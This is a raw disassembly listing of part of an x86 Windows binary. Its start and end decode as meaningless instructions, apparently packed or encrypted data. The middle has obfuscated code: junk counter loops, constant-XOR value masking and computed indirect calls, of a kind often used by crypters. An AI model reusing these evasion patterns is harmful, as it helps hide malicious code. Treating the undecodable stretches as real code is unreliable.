  404ff1:	imul   ebp,DWORD PTR [eax],0x2f
  404ff4:	adc    bh,cl
  404ff6:	(bad)  
  404ff7:	leave  
  404ff8:	sub    eax,0xa481522c
  404ffd:	cmp    bh,bl
  404fff:	mov    WORD PTR [esp+ebx*2+0x792ac75d],ds
  405006:	(bad)  
  405007:	cmp    BYTE PTR [ebx-0x9946c4b],ch
  40500d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40500e:	cld    
  40500f:	jns    0x40502d
  405011:	sbb    bh,BYTE PTR [edi+0x21]
  405014:	aaa    
  405015:	dec    esi
  405016:	cmp    BYTE PTR [edx+edi*2+0x78],bl
  40501a:	cmc    
  40501b:	cmp    al,0x1e
  40501d:	loop   0x405058
  40501f:	and    cl,BYTE PTR [edx-0x7]
  405022:	cmc    
  405023:	imul   BYTE PTR [ebp+0x4d6ea4d2]
  405029:	mov    al,ds:0x196a820c
  40502e:	mov    bh,0x8
  405030:	add    eax,0xbdb5a64b
  405035:	mov    esi,0x6243d0b3
  40503a:	and    al,0xc6
  40503c:	call   0xe5f1:0xa0b23e37
  405043:	xchg   edx,eax
  405044:	je     0x405019
  405046:	clc    
  405047:	jmp    0x9a94:0xe8de3459
  40504e:	mov    WORD PTR [ebp+0x1a5c8ccb],?
  405054:	aaa    
  405055:	adc    ebx,ecx
  405057:	pop    edi
  405058:	jnp    0x405014
  40505a:	pop    ds
  40505b:	sub    eax,0xacbd4c64
  405060:	sti    
  405061:	aam    0x28
  405063:	lods   eax,DWORD PTR ds:[esi]
  405064:	push   0xb878dd7c
  405069:	inc    edi
  40506a:	(bad)  
  40506b:	jecxz  0x4050ce
  40506d:	pop    edx
  40506e:	sub    DWORD PTR [edi],ecx
  405070:	adc    DWORD PTR [ebp+0x54f4c73b],ecx
  405076:	push   es
  405077:	and    esi,eax
  405079:	mov    esp,0x483859a1
  40507e:	std    
  40507f:	adc    al,0x9e
  405081:	or     al,0x81
  405083:	jnp    0x405040
  405085:	repnz or esp,DWORD PTR [esi+0x5c]
  405089:	mov    ds:0xd437b690,eax
  40508e:	xor    ebx,ebx
  405090:	xor    eax,0xe321c0cc
  405095:	aad    0xc
  405097:	es ins DWORD PTR es:[edi],dx
  405099:	xor    DWORD PTR [edi],edx
  40509b:	add    ebp,DWORD PTR [eax]
  40509d:	jne    0x4050b0
  40509f:	push   ds
  4050a0:	int3   
  4050a1:	rcl    ebp,cl
  4050a3:	xor    DWORD PTR [eax-0x26b1f855],0x21
  4050aa:	cmp    DWORD PTR [ebx+ecx*4-0x19],0xb18d9bb4
  4050b2:	inc    esi
  4050b3:	fxch   st(0)
  4050b5:	test   DWORD PTR [esp+edx*2-0x39],0xf6a4825f
  4050bd:	mov    dh,0x8d
  4050bf:	push   ss
  4050c0:	pop    es
  4050c1:	stos   BYTE PTR es:[edi],al
  4050c2:	bnd jl 0x405064
  4050c5:	hlt    
  4050c6:	jb     0x405069
  4050c8:	stc    
  4050c9:	loop   0x405094
  4050cb:	bound  ebp,QWORD PTR [eax]
  4050cd:	push   0x478f2800
  4050d2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4050d3:	les    edx,FWORD PTR [esi]
  4050d5:	cvttps2pi mm5,QWORD PTR [edx-0x54]
  4050d9:	outs   dx,BYTE PTR ss:[esi]
  4050db:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4050dc:	or     ebx,ebp
  4050de:	test   eax,0x659a5bc1
  4050e3:	js     0x405079
  4050e5:	leave  
  4050e6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4050e7:	mov    ds:0xb9a2d32a,al
  4050ec:	in     eax,0x81
  4050ee:	ret    
  4050ef:	push   ebp
  4050f0:	mov    ebx,0x2f5c5608
  4050f5:	pop    DWORD PTR [esi+0x7e]
  4050f8:	sbb    BYTE PTR [esi-0x56b767bd],bh
  4050fe:	jbe    0x4050f4
  405100:	sub    edi,DWORD PTR [eax+ebp*8-0x3716ab8e]
  405107:	lods   eax,DWORD PTR ds:[esi]
  405108:	xor    DWORD PTR [edi],eax
  40510a:	or     al,0x86
  40510c:	mov    esi,ss
  40510e:	cmc    
  40510f:	push   es
  405110:	sub    esi,DWORD PTR [eax+0x400e9779]
  405116:	dec    ecx
  405117:	mov    ch,dl
  405119:	cli    
  40511a:	push   ebx
  40511b:	mov    eax,0x183c16ad
  405120:	adc    ah,0x35
  405123:	iret   
  405124:	push   edi
  405125:	ss scas al,BYTE PTR es:[edi]
  405127:	dec    edx
  405128:	sub    bl,BYTE PTR [edi-0x62]
  40512b:	repnz lahf 
  40512d:	in     eax,0x70
  40512f:	pop    esi
  405130:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405131:	pusha  
  405132:	retf   0xde7e
  405135:	out    0x1e,al
  405137:	retf   0xdbe4
  40513a:	out    dx,al
  40513b:	out    0xb9,al
  40513d:	xchg   edi,eax
  40513e:	adc    eax,0x4ea314e0
  405143:	mov    cl,dl
  405145:	xor    eax,0x2975d4d5
  40514a:	pop    ecx
  40514c:	mov    ch,0xa5
  40514e:	mov    dl,0xd2
  405150:	pushf  
  405151:	jge    0x4051a9
  405153:	or     eax,0x6c2bd807
  405158:	out    dx,al
  405159:	retf   0xa6a4
  40515c:	jb     0x4051d4
  40515e:	(bad)  
  40515f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405160:	jnp    0x4051d2
  405162:	ins    BYTE PTR es:[edi],dx
  405163:	test   eax,0xf9fd60c3
  405168:	mov    WORD PTR [edx],gs
  40516a:	xor    ch,dh
  40516c:	fs loop 0x40510e
  40516f:	fs jmp 0xac45:0xa22de2
  405177:	loope  0x4051af
  405179:	(bad)  
  40517a:	xchg   edx,eax
  40517b:	sub    cl,bh
  40517d:	enter  0x4943,0x7
  405181:	loopne 0x4051c3
  405183:	sbb    DWORD PTR [eax-0x1431a647],esp
  405189:	jnp    0x40511b
  40518b:	or     al,bl
  40518d:	clc    
  40518e:	mov    esi,0x7ebc684b
  405193:	cmp    al,0x7d
  405195:	jecxz  0x405190
  405197:	clc    
  405198:	jmp    0x4051fe
  40519a:	retf   0xf01
  40519d:	pushf  
  40519e:	dec    edi
  40519f:	cmc    
  4051a0:	jmp    0x857c9f2e
  4051a5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4051a6:	ror    BYTE PTR ds:0xcdeae43e,1
  4051ac:	jl     0x40521c
  4051ae:	jo     0x405223
  4051b0:	rcr    BYTE PTR [ebp-0x16],1
  4051b3:	cmp    eax,0xed07c8fb
  4051b8:	out    0x63,al
  4051ba:	mov    eax,eax
  4051bc:	arpl   WORD PTR [ebx-0x3e7f1342],bp
  4051c2:	into   
  4051c3:	out    0x12,eax
  4051c5:	mov    ecx,0xcfcb739c
  4051ca:	inc    esp
  4051cb:	sbb    DWORD PTR [ecx-0x4b],esp
  4051ce:	sub    ch,BYTE PTR [ecx]
  4051d0:	inc    eax
  4051d1:	mov    ebp,0xa8187dae
  4051d6:	push   eax
  4051d7:	or     al,0x2
  4051d9:	mov    ebp,0xc234ac7b
  4051de:	mov    esi,0x67918cdb
  4051e3:	xor    eax,0xbcd3b740
  4051e8:	dec    ebp
  4051e9:	out    dx,al
  4051ea:	jecxz  0x405198
  4051ec:	(bad)  
  4051ed:	cmp    eax,0x19568bc3
  4051f2:	sub    BYTE PTR [ebp+0x62],al
  4051f5:	(bad)  
  4051f6:	sub    al,0x11
  4051f8:	sbb    DWORD PTR [ebp-0x559a20c8],0xfe806801
  405202:	arpl   WORD PTR [edi],dx
  405204:	cmp    DWORD PTR [ecx],ecx
  405206:	jmp    0xcc9c:0xa42b945d
  40520d:	(bad)  
  40520e:	push   ebp
  40520f:	pop    ss
  405210:	fs push 0x4976f95c
  405216:	mov    edx,0x56612f46
  40521b:	das    
  40521c:	ins    BYTE PTR es:[edi],dx
  40521d:	out    0x9a,eax
  40521f:	lds    eax,FWORD PTR [esi]
  405221:	adc    esi,DWORD PTR [ebx]
  405223:	ret    
  405224:	add    eax,0x3272dc
  405229:	jmp    0x405392
  40522e:	mov    ecx,DWORD PTR [ebp-0x38]
  405231:	add    ecx,DWORD PTR [ebp+0x8]
  405234:	mov    DWORD PTR [ebp-0x10],ecx
  405237:	mov    ecx,DWORD PTR [ebp-0x1c]
  40523a:	test   ecx,ecx
  40523c:	je     0x40531d
  405242:	mov    DWORD PTR [ebp-0x20],0x0
  405249:	push   0x3
  40524b:	xor    edx,edx
  40524d:	pop    edx
  40524e:	add    edx,0x8
  405251:	push   edx
  405252:	pop    ecx
  405253:	push   0x6
  405255:	dec    ecx
  405256:	pop    ebx
  405257:	dec    ebx
  405258:	xchg   ebx,ecx
  40525a:	sub    ebx,ecx
  40525c:	xchg   ebx,ecx
  40525e:	dec    ecx
  40525f:	mov    eax,DWORD PTR [ebp-0x1c]
  405262:	imul   eax,ecx
  405265:	sub    esp,eax
  405267:	mov    DWORD PTR [ebp-0x20],esp
  40526a:	mov    eax,DWORD PTR [ebp-0x4]
  40526d:	mov    ecx,0x7510894
  405272:	xor    eax,ecx
  405274:	mov    edx,0x3272dc
  405279:	add    eax,edx
  40527b:	mov    DWORD PTR [ebp+0x8],eax
  40527e:	mov    eax,DWORD PTR [ebp-0x14]
  405281:	xor    eax,ecx
  405283:	add    eax,edx
  405285:	mov    edx,DWORD PTR [ebp+0x14]
  405288:	imul   eax,DWORD PTR [edx]
  40528b:	mov    edx,DWORD PTR [ebp-0x4]
  40528e:	xor    edx,ecx
  405290:	mov    ecx,DWORD PTR [ebp+0x8]
  405293:	lea    ecx,[edx+ecx*1+0x3272dc]
  40529a:	cmp    ecx,eax
  40529c:	je     0x405313
  4052a2:	mov    edi,DWORD PTR [ebp-0x14]
  4052a5:	mov    eax,DWORD PTR [ebp+0x8]
  4052a8:	mov    edx,DWORD PTR [ebp+0x14]
  4052ab:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  4052af:	mov    ecx,0x7510894
  4052b4:	xor    edx,edx
  4052b6:	xor    edi,ecx
  4052b8:	mov    esi,0x3272dc
  4052bd:	add    edi,esi
  4052bf:	div    edi
  4052c1:	mov    edx,DWORD PTR [ebp-0x4]
  4052c4:	xor    edx,ecx
  4052c6:	lea    eax,[edx+eax*1+0x3272dc]
  4052cd:	mov    edx,DWORD PTR [ebp+0x8]
  4052d0:	mov    edi,DWORD PTR [ebp-0x20]
  4052d3:	mov    DWORD PTR [edi+edx*4],eax
  4052d6:	mov    eax,DWORD PTR [ebp-0x14]
  4052d9:	mov    edx,DWORD PTR [ebp+0x8]
  4052dc:	xor    eax,ecx
  4052de:	lea    eax,[eax+edx*1+0x3272dc]
  4052e5:	mov    DWORD PTR [ebp+0x8],eax
  4052e8:	mov    eax,DWORD PTR [ebp-0x14]
  4052eb:	mov    edx,DWORD PTR [ebp+0x14]
  4052ee:	xor    eax,ecx
  4052f0:	add    eax,esi
  4052f2:	imul   eax,DWORD PTR [edx]
  4052f5:	mov    edx,DWORD PTR [ebp-0x4]
  4052f8:	xor    edx,ecx
  4052fa:	mov    ecx,DWORD PTR [ebp+0x8]
  4052fd:	lea    ecx,[edx+ecx*1+0x3272dc]
  405304:	cmp    ecx,eax
  405306:	jne    0x4052a2
  40530c:	mov    eax,esi
  40530e:	jmp    0x405318
  405313:	mov    eax,0x3272dc
  405318:	mov    ebx,0x7510894
  40531d:	mov    ecx,DWORD PTR [ebp-0x4]
  405320:	xor    ecx,ebx
  405322:	add    ecx,eax
  405324:	mov    DWORD PTR [ebp-0xc],ecx
  405327:	mov    ebx,0x65655
  40532c:	add    ebx,0x3234
  405332:	xchg   ebx,esi
  405334:	xor    ebx,ebx
  405336:	push   esi
  405337:	mov    esi,ebx
  405339:	pop    ebx
  40533a:	mov    edx,esi
  40533c:	add    ebx,0x1002
  405342:	lea    eax,[ebp-0x10]
  405345:	add    edx,eax
  405347:	add    edx,0x5
  40534a:	push   edx
  40534b:	inc    esi
  40534c:	pop    ecx
  40534d:	dec    ecx
  40534e:	xchg   ecx,eax
  40534f:	dec    eax
  405350:	xchg   ecx,eax
  405351:	dec    ecx
  405352:	xchg   ecx,edx
  405354:	dec    edx
  405355:	push   edx
  405356:	mov    edx,ebx
  405358:	pop    ebx
  405359:	dec    ebx
  40535a:	call   DWORD PTR [ebx]
  40535c:	cmp    DWORD PTR [ebp+0x10],esi
  40535f:	je     0x40537e
  405365:	xchg   edx,eax
  405366:	push   0xb
  405368:	pop    ecx
  405369:	push   0x4
  40536b:	pop    ebx
  40536c:	inc    ebx
  40536d:	xchg   ebx,ecx
  40536f:	sub    ebx,ecx
  405371:	xchg   ebx,ecx
  405373:	dec    ecx
  405374:	dec    ecx
  405375:	mov    eax,DWORD PTR [ebp-0x1c]
  405378:	imul   eax,ecx
  40537b:	add    esp,eax
  40537d:	xchg   edx,eax
  40537e:	push   eax
  40537f:	xor    ebx,ebx
  405381:	mov    edx,esp
  405383:	dec    edx
  405384:	inc    ebx
  405385:	add    ebx,DWORD PTR [edx+ebx*1]
  405388:	dec    ebx
  405389:	xor    edx,edx
  40538b:	add    DWORD PTR [ebp-0xc],ebx
  40538e:	pop    ebx
  40538f:	mov    eax,DWORD PTR [ebp-0xc]
  405392:	pop    edi
  405393:	pop    esi
  405394:	pop    ebx
  405395:	leave  
  405396:	ret    0x10
  405399:	push   ebp
  40539a:	mov    ebp,esp
  40539c:	sub    esp,0x18
  40539f:	and    DWORD PTR ds:0x413c1e,0x0
  4053a9:	mov    ecx,DWORD PTR ds:0x413c1e
  4053af:	inc    ecx
  4053b0:	mov    DWORD PTR ds:0x413c1e,ecx
  4053b6:	cmp    DWORD PTR ds:0x413c1e,0x8
  4053bd:	jne    0x4053d7
  4053c3:	push   DWORD PTR [ebp-0x20]
  4053c6:	push   0x413cf0
  4053cb:	push   DWORD PTR [ebp-0x24]
  4053ce:	push   DWORD PTR [ebp-0x14]
  4053d1:	call   DWORD PTR ds:0x416770
  4053d7:	cmp    DWORD PTR ds:0x413c1e,0x7
  4053de:	jne    0x4053f3
  4053e4:	xor    ecx,ecx
  4053e6:	or     ecx,DWORD PTR ds:0x413c1e
  4053ec:	inc    ecx
  4053ed:	mov    DWORD PTR ds:0x413c1e,ecx
  4053f3:	cmp    DWORD PTR ds:0x413c1e,0x1f
  4053fa:	jb     0x4053a9
  405400:	and    DWORD PTR ds:0x413c12,ecx
  405406:	mov    DWORD PTR [ebp-0x10],0xf89f85b0
  40540d:	xor    edx,edx
  40540f:	or     edx,DWORD PTR ds:0x413cc0
  405415:	mov    edx,DWORD PTR [edx]
  405417:	and    DWORD PTR ds:0x413ce8,edx
  40541d:	lea    eax,[ebp+0x14]
  405420:	mov    DWORD PTR [ebp-0x4],eax
  405423:	push   esi
  405424:	adc    edx,ecx
  405426:	mov    esi,0xf89c85b0
  40542b:	mov    DWORD PTR [ebp-0xc],esi
  40542e:	and    DWORD PTR ds:0x413c74,0x0
  405438:	jmp    0x40544a
  40543d:	mov    edx,DWORD PTR ds:0x413c74
  405443:	inc    edx
  405444:	mov    DWORD PTR ds:0x413c74,edx
  40544a:	cmp    DWORD PTR ds:0x413c74,0x1a
  405451:	jae    0x405550
  405457:	cmp    DWORD PTR ds:0x413c74,0x10
  40545e:	jne    0x40547c
  405464:	push   0x41401c
  405469:	push   DWORD PTR [ebp-0x14]
  40546c:	push   0x416140
  405471:	push   0x4161b2
  405476:	call   DWORD PTR ds:0x416774
  40547c:	cmp    DWORD PTR ds:0x413c74,0xf
  405483:	jne    0x405498
  405489:	xor    edx,edx
  40548b:	add    edx,DWORD PTR ds:0x413c74
  405491:	inc    edx
  405492:	mov    DWORD PTR ds:0x413c74,edx
  405498:	jmp    0x40543d
  40549d:	and    DWORD PTR ds:0x413c0e,0x0
  4054a7:	jmp    0x4054b9
  4054ac:	mov    ecx,DWORD PTR ds:0x413c0e
  4054b2:	inc    ecx
  4054b3:	mov    DWORD PTR ds:0x413c0e,ecx
  4054b9:	cmp    DWORD PTR ds:0x413c0e,0x16
  4054c0:	jae    0x405550
  4054c6:	cmp    DWORD PTR ds:0x413c0e,0x7
  4054cd:	jne    0x4054e8
  4054d3:	push   0x1925
  4054d8:	push   0x413c1a
  4054dd:	push   0x416140
  4054e2:	call   DWORD PTR ds:0x416778
  4054e8:	cmp    DWORD PTR ds:0x413c0e,0x6
  4054ef:	jne    0x405504
  4054f5:	xor    ecx,ecx
  4054f7:	or     ecx,DWORD PTR ds:0x413c0e
  4054fd:	inc    ecx
  4054fe:	mov    DWORD PTR ds:0x413c0e,ecx
  405504:	jmp    0x4054ac
  405509:	mov    DWORD PTR ds:0x413d1c,0x15
  405513:	cmp    DWORD PTR ds:0x413d1c,0x0
  40551a:	je     0x405550
  405520:	cmp    DWORD PTR ds:0x413d1c,0x21
  405527:	jne    0x405538
  40552d:	push   0x416025
  405532:	call   DWORD PTR ds:0x41677c
  405538:	mov    ecx,DWORD PTR ds:0x413d1c
  40553e:	dec    ecx
  40553f:	mov    DWORD PTR ds:0x413d1c,ecx
  405545:	jmp    0x405513
  40554a:	adc    edx,0x7769
  405550:	lea    eax,[ebp-0xc]
  405553:	mov    DWORD PTR [ebp-0x14],eax
  405556:	or     eax,DWORD PTR ds:0x413c0a
  40555c:	mov    eax,DWORD PTR [ebp-0xc]
  40555f:	and    edx,edx
  405561:	mov    edx,DWORD PTR [ebp-0x14]
  405564:	mov    ecx,0x7510894
  405569:	xor    eax,ecx
  40556b:	add    eax,0x3272dc
  405570:	mov    DWORD PTR [edx],eax
  405572:	and    DWORD PTR ds:0x413d34,0x0
  40557c:	jmp    0x40558c
  405581:	mov    eax,ds:0x413d34
  405586:	inc    eax
  405587:	mov    ds:0x413d34,eax
  40558c:	cmp    DWORD PTR ds:0x413d34,0x17
  405593:	jae    0x4055dc
  405599:	cmp    DWORD PTR ds:0x413d34,0x8
  4055a0:	jne    0x4055b9
  4055a6:	push   0x413cec
  4055ab:	push   DWORD PTR [ebp-0x24]
  4055ae:	push   0x416049
  4055b3:	call   DWORD PTR ds:0x416780
  4055b9:	cmp    DWORD PTR ds:0x413d34,0x7
  4055c0:	jne    0x4055d1
  4055c6:	mov    eax,ds:0x413d34
  4055cb:	inc    eax
  4055cc:	mov    ds:0x413d34,eax
  4055d1:	jmp    0x405581
  4055d6:	and    edx,DWORD PTR ds:0x413bfe
  4055dc:	mov    eax,ds:0x41622c
  4055e1:	mov    edx,DWORD PTR [ebp-0x4]
  4055e4:	add    DWORD PTR ds:0x413bf6,0x4ad3
  4055ee:	mov    eax,DWORD PTR [eax]
  4055f0:	add    eax,DWORD PTR [edx]
  4055f2:	sbb    DWORD PTR ds:0x413c80,0x777b
  4055fc:	push   edi
  4055fd:	xor    DWORD PTR ds:0x413c06,ebx
  405603:	mov    DWORD PTR [ebp-0x8],eax
  405606:	mov    edi,DWORD PTR [ebp+0x8]
  405609:	movzx  eax,BYTE PTR ds:0x413d28
  405610:	sub    DWORD PTR ds:0x413c06,eax
  405616:	mov    eax,ds:0x4163b4
  40561b:	mov    eax,DWORD PTR [eax+0x198]
  405621:	adc    edx,DWORD PTR ds:0x414010
  405627:	xor    edi,ecx
  405629:	mov    edx,0x3272dc
  40562e:	add    DWORD PTR ds:0x413c1a,0x413cd8
  405638:	add    edi,edx
  40563a:	mov    DWORD PTR ds:0x413d28,0x4988
  405644:	cmp    DWORD PTR [eax],edi
  405646:	je     0x40565d
  40564c:	mov    eax,DWORD PTR [eax]
  40564e:	mov    DWORD PTR ds:0x413ce4,0xf81
  405658:	jmp    0x407c4a
  40565d:	mov    eax,DWORD PTR [ebp+0x18]
  405660:	mov    DWORD PTR ds:0x413c06,0x7bbf
  40566a:	cmp    eax,esi
  40566c:	mov    DWORD PTR ds:0x413d30,0x2bf7
  405676:	jne    0x405686
  40567c:	push   0xf89c85b1
  405681:	jmp    0x407c39
  405686:	mov    esi,DWORD PTR [ebp+0x18]
  405689:	movzx  eax,WORD PTR ds:0x413cf0
  405690:	mov    eax,0xf89c85b2
  405695:	cmp    esi,eax
  405697:	jne    0x407c29
  40569d:	mov    eax,DWORD PTR [ebp+0x10]
  4056a0:	inc    DWORD PTR ds:0x413c80
  4056a6:	xor    eax,ecx
  4056a8:	add    eax,edx
  4056aa:	mov    DWORD PTR [ebp-0x18],eax
  4056ad:	adc    DWORD PTR ds:0x413d1c,0x3347
  4056b7:	mov    eax,DWORD PTR [ebp+0xc]
  4056ba:	mov    esi,DWORD PTR [ebp-0x8]
  4056bd:	xor    eax,ecx
  4056bf:	sbb    DWORD PTR ds:0x413ce4,0x413c70
  4056c9:	add    eax,edx
  4056cb:	imul   eax,DWORD PTR [esi]
  4056ce:	and    DWORD PTR ds:0x413c0a,ebx
  4056d4:	mov    esi,DWORD PTR [ebp+0x8]
  4056d7:	and    DWORD PTR ds:0x413d24,0x413c02
  4056e1:	xor    esi,ecx
  4056e3:	add    esi,edx
  4056e5:	cmp    esi,eax
  4056e7:	movzx  eax,BYTE PTR ds:0x413cf0
  4056ee:	mov    eax,DWORD PTR [ebp-0x4]
  4056f1:	push   ebx
  4056f2:	mov    DWORD PTR ds:0x414000,0x6197
  4056fc:	je     0x40577e
  405702:	and    DWORD PTR ds:0x413c1e,0x0
  40570c:	jmp    0x40571e
  405711:	mov    esi,DWORD PTR ds:0x413c1e
  405717:	inc    esi
  405718:	mov    DWORD PTR ds:0x413c1e,esi
  40571e:	cmp    DWORD PTR ds:0x413c1e,0x14
  405725:	jae    0x405765
  40572b:	cmp    DWORD PTR ds:0x413c1e,0xa
  405732:	jne    0x405746
  405738:	push   0x413d1c
  40573d:	push   DWORD PTR [ebp-0x24]
  405740:	call   DWORD PTR ds:0x416784
  405746:	cmp    DWORD PTR ds:0x413c1e,0x9
  40574d:	jne    0x405760
  405753:	mov    esi,DWORD PTR ds:0x413c1e
  405759:	inc    esi
  40575a:	mov    DWORD PTR ds:0x413c1e,esi
  405760:	jmp    0x405711
  405765:	mov    esi,DWORD PTR [ebp-0x18]
  405768:	add    DWORD PTR [eax],esi
  40576a:	mov    eax,DWORD PTR [ebp-0x4]
  40576d:	mov    esi,DWORD PTR [ebp+0xc]
  405770:	xor    esi,ecx
  405772:	add    esi,edx
  405774:	imul   esi,DWORD PTR [eax]
  405777:	mov    DWORD PTR [eax],esi
  405779:	jmp    0x405783
  40577e:	mov    esi,DWORD PTR [ebp+0x14]
  405781:	xor    DWORD PTR [eax],esi
  405783:	mov    eax,DWORD PTR [ebp-0x4]
  405786:	mov    edi,DWORD PTR [ebp+0x10]
  405789:	xor    edi,ecx
  40578b:	mov    esi,0xffcd8d24
  405790:	mov    ebx,esi
  405792:	sub    ebx,edi
  405794:	add    DWORD PTR [eax],ebx
  405796:	mov    eax,DWORD PTR [ebp-0x4]
  405799:	mov    edi,DWORD PTR [ebp-0x8]
  40579c:	add    edi,DWORD PTR [eax]
  40579e:	mov    DWORD PTR [ebp-0x8],edi
  4057a1:	mov    eax,DWORD PTR [ebp+0xc]
  4057a4:	mov    edi,DWORD PTR [ebp+0xc]
  4057a7:	xor    edi,ecx
  4057a9:	xor    eax,ecx
  4057ab:	lea    eax,[eax+edi*1+0x64e5b8]
  4057b2:	mov    edi,DWORD PTR [ebp+0xc]
  4057b5:	xor    edi,ecx
  4057b7:	add    edi,edx
  4057b9:	imul   eax,edi
  4057bc:	mov    edi,DWORD PTR [ebp+0xc]
  4057bf:	xor    edi,ecx
  4057c1:	sub    edi,eax
  4057c3:	mov    eax,DWORD PTR [ebp-0x4]
  4057c6:	add    edi,edx
  4057c8:	cmp    DWORD PTR [eax],edi
  4057ca:	mov    eax,DWORD PTR [ebp-0x4]
  4057cd:	mov    edi,DWORD PTR [ebp+0x10]
  4057d0:	jg     0x4057e3
  4057d6:	xor    edi,ecx
  4057d8:	mov    ebx,esi
  4057da:	sub    ebx,edi
  4057dc:	add    DWORD PTR [eax],ebx
  4057de:	jmp    0x4057e9
  4057e3:	xor    edi,ecx
  4057e5:	add    edi,edx
  4057e7:	add    DWORD PTR [eax],edi
  4057e9:	mov    eax,DWORD PTR [ebp-0x8]
  4057ec:	mov    edi,DWORD PTR [ebp-0x10]
  4057ef:	mov    eax,DWORD PTR [eax]
  4057f1:	jmp    0x407b3d
  4057f6:	imul   ebp,DWORD PTR [edx+0x66],0xaba967a5
  4057fd:	stos   BYTE PTR es:[edi],al
  4057fe:	(bad)  
  4057ff:	sbb    eax,0xd21994ee
  405804:	dec    ebp
  405805:	pop    ss
  405806:	loopne 0x405867
  405808:	jl     0x405886
  40580a:	dec    ebx
  40580b:	pop    edi
  40580c:	jl     0x40588a
  40580e:	xchg   esi,eax
  40580f:	cmp    edx,DWORD PTR [ebp+0x32]
  405812:	xchg   esp,eax
  405813:	mov    BYTE PTR es:[esi+0x2f],al
  405817:	test   DWORD PTR [ebx-0x1732434a],esp
  40581d:	(bad)  
  40581e:	or     eax,0xb7a5d6fd
  405823:	into   
  405824:	shl    DWORD PTR [esi-0x2c],0x1
  405828:	cli    
  405829:	retf   
  40582a:	loope  0x4058a4
  40582c:	retf   0xa604
  40582f:	je     0x4057b5
  405831:	arpl   bx,ax
  405833:	aaa    
  405834:	sub    edi,DWORD PTR [esi]
  405836:	xor    ecx,esi
  405838:	dec    ebx
  405839:	mov    dl,0x95
  40583b:	std    
  40583c:	jno    0x4057d4
  40583e:	retf   0x277c
  405841:	mov    ch,0x95
  405843:	stc    
  405844:	adc    al,0x5c
  405846:	je     0x405894
  405848:	xor    BYTE PTR [edi],bl
  40584a:	mov    ah,BYTE PTR [esi+0x3]
  40584d:	test   al,0xf8
  40584f:	clc    
  405850:	adc    bl,BYTE PTR [esi+0x2f]
  405853:	mov    dl,0x57
  405855:	iret   
  405856:	xchg   edi,eax
  405857:	ror    ah,0x3b
  40585a:	vxorps ymm4,ymm6,ymm6
  40585e:	hlt    
  40585f:	cmp    cl,BYTE PTR [eax]
  405861:	in     al,0x4c
  405863:	cmp    BYTE PTR [esi+eiz*2-0x3c4bb151],dh
  40586a:	shr    BYTE PTR [ecx],1
  40586c:	inc    ecx
  40586d:	bound  edx,QWORD PTR [eax+0x5fdf8d5f]
  405873:	call   0xd3416925
  405878:	inc    ecx
  405879:	lahf   
  40587a:	int3   
  40587b:	lock stos BYTE PTR es:[edi],al
  40587d:	mov    esi,0xbf690fb6
  405882:	push   esp
  405883:	clc    
  405884:	(bad)  [ebx-0x4]
  405887:	sti    
  405888:	jmp    0x984d:0x3a79e756
  40588f:	outs   dx,DWORD PTR cs:[esi]
  405891:	push   cs
  405892:	inc    ebp
  405893:	cmp    ebx,ecx
  405895:	(bad)  
  405897:	int3   
  405898:	jns    0x4058fe
  40589a:	popa   
  40589b:	pop    edx
  40589c:	ss sbb bl,dh
  40589f:	cwde   
  4058a0:	dec    esi
  4058a1:	sbb    eax,0x3da9061e
  4058a6:	mov    ecx,0xd490ea18
  4058ab:	scas   eax,DWORD PTR es:[edi]
  4058ac:	fwait
  4058ad:	cwde   
  4058ae:	fild   WORD PTR [ebx+0x59]
  4058b1:	enter  0x7b3,0x65
  4058b5:	pop    esi
  4058b6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4058b7:	popf   
  4058b8:	mov    WORD PTR [edx],?
  4058ba:	add    al,0xd8
  4058bc:	mov    dl,0x3b
  4058be:	push   esi
  4058bf:	mov    bl,0xb4
  4058c1:	xor    DWORD PTR [ebx-0x50eff40f],edi
  4058c7:	pop    eax
  4058c8:	les    esp,FWORD PTR [edi-0x6adadeb9]
  4058ce:	pop    edi
  4058cf:	mov    al,0xd4
  4058d1:	mov    ebx,0xb389c817
  4058d6:	xchg   ebx,eax
  4058d7:	xchg   ebx,eax
  4058d8:	sbb    BYTE PTR [esp+edx*4],al
  4058db:	mov    cl,0xea
  4058dd:	mov    dh,0x2
  4058df:	imul   ebx,DWORD PTR [esi-0x5d25ebab],0xffffffa8
  4058e6:	popa   
  4058e7:	pop    ebp
  4058e8:	push   cs
  4058e9:	icebp  
  4058ea:	push   ebp
  4058eb:	imul   ecx,DWORD PTR [esp+ebx*1],0xa475f049
  4058f2:	repz hlt 
  4058f4:	inc    esp
  4058f5:	in     eax,0x2d
  4058f7:	mul    DWORD PTR [esp+edx*4-0x1b]
  4058fb:	iret   
  4058fc:	js     0x405944
  4058fe:	das    
  4058ff:	(bad)  
  405903:	and    bh,0xb8
  405906:	mov    edi,0x7aea55cd
  40590b:	retf   
  40590c:	ret    0x3d2f
  40590f:	push   es
  405910:	push   es
  405911:	ins    BYTE PTR es:[edi],dx
  405912:	retf   
  405913:	jl     0x405953
  405915:	sbb    al,0xec
  405917:	clc    
  405918:	cmp    eax,0xca5f9abe
  40591d:	xor    dh,cl
  40591f:	arpl   WORD PTR [ebp+0x6b2e692e],si
  405925:	sbb    eax,0x6677af5
  40592a:	pop    esi
  40592b:	jno    0x40593a
  40592d:	adc    eax,0xf13e1673
  405932:	repz test BYTE PTR [esi+ebx*1-0x17],ch
  405937:	(bad)  
  405938:	in     eax,dx
  405939:	hlt    
  40593a:	jmp    DWORD PTR [eax+0x2c]
  40593d:	jmp    0x3ad1:0xc2ff44d9
  405944:	out    0x89,al
  405946:	push   ebx
  405947:	mov    eax,ds:0x91a7f14a
  40594c:	mov    dh,0x4
  40594e:	add    ecx,DWORD PTR [ebx]
  405950:	(bad)  
  405951:	mov    esi,0xb98fd5a
  405956:	jbe    0x4058e7
  405958:	mov    bh,0xc6
  40595a:	xor    esp,ebx
  40595c:	push   DWORD PTR [edx+0x5f565dd2]
  405962:	mov    ecx,0x108be621
  405967:	fwait
  405968:	mov    eax,ds:0xe9affde
  40596d:	push   ss
  40596e:	aaa    
  40596f:	or     esp,0x48e33480
  405975:	out    dx,al
